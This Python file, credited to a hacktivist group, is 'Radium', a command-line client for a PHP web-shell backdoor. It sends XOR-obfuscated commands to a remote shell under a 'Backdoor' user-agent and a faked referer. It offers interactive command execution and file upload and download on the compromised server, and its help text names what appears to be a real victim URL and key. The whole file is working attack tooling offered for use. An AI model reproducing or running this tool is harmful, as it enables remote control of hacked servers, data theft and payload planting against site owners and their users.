#Name: Radium
#Tool Type:Shell Executor
#Coded bY Indian Cyber Force

import requests
import json
import base64
import argparse
import os

try:
    from colorama import Fore, Style, init
    init(autoreset=True) 
except ImportError:
    print("Colorama not Found!")
    class NoColor:
        def __getattr__(self):
            return ''
    Fore = NoColor()
    Style = NoColor()

COLOR_PROMPT = Fore.CYAN + Style.BRIGHT
COLOR_SUCCESS = Fore.GREEN + Style.BRIGHT
COLOR_ERROR = Fore.RED + Style.BRIGHT
COLOR_INFO = Fore.YELLOW
COLOR_RESET = Style.RESET_ALL
COLOR_RADIUM = Fore.RED + Style.BRIGHT
COLOR_DOMAIN = Fore.CYAN + Style.BRIGHT
COLOR_DIR_PATH = Fore.BLUE + Style.BRIGHT 

def xor(data, key):
    encrypted_data = bytearray()
    key_bytes = key.encode('utf-8')
    data_bytes = data.encode('utf-8')
    for i in range(len(data_bytes)):
        encrypted_data.append(data_bytes[i] ^ key_bytes[i % len(key_bytes)])
    return encrypted_data.decode('latin-1')

def send_request(target, payload, auth_key):
    try:
        json_payload = json.dumps(payload)
        encrypt3d = xor(json_payload, auth_key)
        url = f"{target}?track=ua_check"
        headers = {
            "User-Agent": "Mozilla/5.0 (Backdoor)",
            "Referer": "http://google.com",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive"
        }
        session = requests.Session()
        response = session.post(url, data={'data': encrypt3d}, headers=headers, timeout=30)
        response.raise_for_status()
        decrypted_output = xor(response.text, auth_key)
        return decrypted_output
    except requests.exceptions.HTTPError as e:
        if e.response.status_code == 404:
            return f"{COLOR_ERROR}Shell not found or auth failed.{COLOR_RESET}"
        return f"{COLOR_ERROR}HTTP error: {e.response.status_code} - {e.response.reason}{COLOR_RESET}"
    except requests.exceptions.ConnectionError as e:
        return f"{COLOR_ERROR}Connection error: {e}{COLOR_RESET}"
    except requests.exceptions.Timeout:
        return f"{COLOR_ERROR}Request timed out.{COLOR_RESET}"
    except json.JSONDecodeError:
        return f"{COLOR_ERROR}Auth key incorrect.{COLOR_RESET}"
    except Exception as e:
        return f"{COLOR_ERROR}Request error: {e}{COLOR_RESET}"

def execute_command(target, command, auth_key):
    payload = {
        'auth_key': auth_key,
        'cmd': command
    }
    return send_request(target, payload, auth_key)

def upload_file(target, local_path, remote_path, auth_key):
    try:
        if not os.path.exists(local_path):
            return f"{COLOR_ERROR}Local file not found: '{local_path}'.{COLOR_RESET}"
        with open(local_path, 'rb') as f:
            file_content = f.read()
        file_content_b64 = base64.b64encode(file_content).decode('utf-8')
        payload = {
            'auth_key': auth_key,
            'action': 'upload',
            'filename': remote_path,
            'file_content': file_content_b64
        }
        return send_request(target, payload, auth_key)
    except Exception as e:
        return f"{COLOR_ERROR}Upload error: {e}{COLOR_RESET}"

def download_file(target, remote_path, local_path, auth_key):
    try:
        payload = {
            'auth_key': auth_key,
            'action': 'download',
            'filename': remote_path
        }
        response_text = send_request(target, payload, auth_key)

        if response_text.startswith(f"{COLOR_ERROR}"):
            return response_text
        try:
            decoded_content = base64.b64decode(response_text)
        except base64.binascii.Error:
            return f"{COLOR_ERROR}Download error: Invalid content or file missing.{COLOR_RESET}"

        with open(local_path, 'wb') as f:
            f.write(decoded_content)
        return f"{COLOR_SUCCESS}Downloaded '{remote_path}' to '{local_path}'.{COLOR_RESET}"
    except Exception as e:
        return f"{COLOR_ERROR}Download error: {e}{COLOR_RESET}"

def icfbanner():
    banner = f"""{Fore.MAGENTA}{Style.BRIGHT}
_______________________________________________________________
|                                                              |
|    ---------------------------------------------------       |
|                                                              |
|    RRRRRR   AAAAAA  DDDDDD   IIIIIII UU    UU MMMMMMMM       |
|    RR   RR  AA  AA  DD   DD    III   UU    UU MM MM MM       |
|    RRRRRR   AAAAAA  DD   DD    III   UU    UU MM    MM       |
|    RR  RR   AA  AA  DD   DD    III   UU    UU MM    MM       |
|    RR   RR  AA  AA  DDDDDD   IIIIIII  UUUUUUU MM    MM       |
|                                                              |
|   ----------------------------------------------------       |
|______________________________________________________________|

{Fore.YELLOW}Radium CLI Based Shell Executor {COLOR_RESET}
"""
    print(banner)

def main():
    parser = argparse.ArgumentParser(description="Radium CLI Shell.")
    parser.add_argument("url", help="Target URL (http://pkmkb.pk/bin/icf/index.php)")
    parser.add_argument("-k", "--key", required=True, help="Auth Key/Password (Default: 'pkmkb')")
    args = parser.parse_args()

    target = args.url
    global AUTH_KEY
    AUTH_KEY = args.key

    icfbanner()

    cwd = "/"

    print(f"{COLOR_INFO}Connecting to {target}{COLOR_RESET}")
    print(f"{COLOR_INFO}Type help For Command, exit To Quit.{COLOR_RESET}\n")
    print("")

    initial_pwd_output = execute_command(target, "pwd", AUTH_KEY)
    if initial_pwd_output and not initial_pwd_output.startswith(f"{COLOR_ERROR}"):
        cwd = initial_pwd_output.strip()
    else:
        print(f"{COLOR_ERROR}Cannot get remote dir. Error: {initial_pwd_output.strip()}{COLOR_RESET}")

    while True:
        try:
            prompt_text = (
                f"{COLOR_RADIUM}radium{COLOR_RESET}"
                f"@{COLOR_DOMAIN}{target.split('//')[1].split('/')[0]}{COLOR_RESET}"
                f":{COLOR_DIR_PATH}{cwd}~$ {COLOR_RESET}"
            )
            cmd_input = input(prompt_text).strip()

            if not cmd_input:
                continue

            parts = cmd_input.split(' ', 1)
            command = parts[0].lower()
            args_str = parts[1] if len(parts) > 1 else ""

            if command in ['exit', 'quit']:
                print(f"{COLOR_INFO}Exiting shell.{COLOR_RESET}")
                break
            elif command == 'help':
                print(f"\n{COLOR_INFO}Commands:{COLOR_RESET}")
                print(f"  {Fore.WHITE}<command>                 : Run Shell Command.")
                print(f"  {Fore.WHITE}cd <directory>            : Change Directory.")
                print(f"  {Fore.WHITE}upload <local> <remote>   : Upload file.")
                print(f"                               Example: upload home/evilinux/Desktop/pkmkb.txt /var/www/pkmkb.txt")
                print(f"  {Fore.WHITE}download <remote> <local> : Download file.")
                print(f"                               Example: download /var/www/remote.txt /tmp/local.txt")
                print(f"  {Fore.WHITE}exit / quit               : Exit shell.")
                print(f"  {Fore.WHITE}help                      : Show this help.")
                print("")
            elif command == 'cd':
                target_dir = args_str.strip()
                if not target_dir:
                    print(cwd)
                    continue

                cd_check_cmd = f"cd {target_dir} && pwd"
                cd_output = execute_command(target, cd_check_cmd, AUTH_KEY)

                if cd_output and not cd_output.startswith(f"{COLOR_ERROR}"):
                    new_path = cd_output.strip()
                    if new_path and new_path.startswith('/'):
                        cwd = new_path
                    else:
                        print(f"{COLOR_ERROR}CD failed or bad path: {cd_output.strip()}{COLOR_RESET}")
                else:
                    print(f"{COLOR_ERROR}CD failed: {cd_output.strip()}{COLOR_RESET}")

            elif command == 'upload':
                upload_parts = args_str.split(' ', 1)
                if len(upload_parts) == 2:
                    local_file = upload_parts[0]
                    remote_path = upload_parts[1]
                    print(f"{COLOR_INFO}Uploading '{local_file}' to '{remote_path}'...{COLOR_RESET}")
                    result = upload_file(target, local_file, remote_path, AUTH_KEY)
                    print(result)
                else:
                    print(f"{COLOR_ERROR}Usage: upload <local_file> <remote_path>{COLOR_RESET}")
            elif command == 'download':
                download_parts = args_str.split(' ', 1)
                if len(download_parts) == 2:
                    remote_file = download_parts[0]
                    local_path = download_parts[1]
                    print(f"{COLOR_INFO}Downloading '{remote_file}' to '{local_path}'...{COLOR_RESET}")
                    result = download_file(target, remote_file, local_path, AUTH_KEY)
                    print(result)
                else:
                    print(f"{COLOR_ERROR}Usage: download <remote_file> <local_path>{COLOR_RESET}")
            else:
                full_cmd_to_execute = f"cd {cwd} && {cmd_input}"
                result = execute_command(target, full_cmd_to_execute, AUTH_KEY)
                print(result)

        except KeyboardInterrupt:
            print(f"{COLOR_INFO}Exiting shell.{COLOR_RESET}")
            break
        except Exception as e:
            print(f"{COLOR_ERROR}Client error: {e}{COLOR_RESET}")

if __name__ == "__main__":
    main()
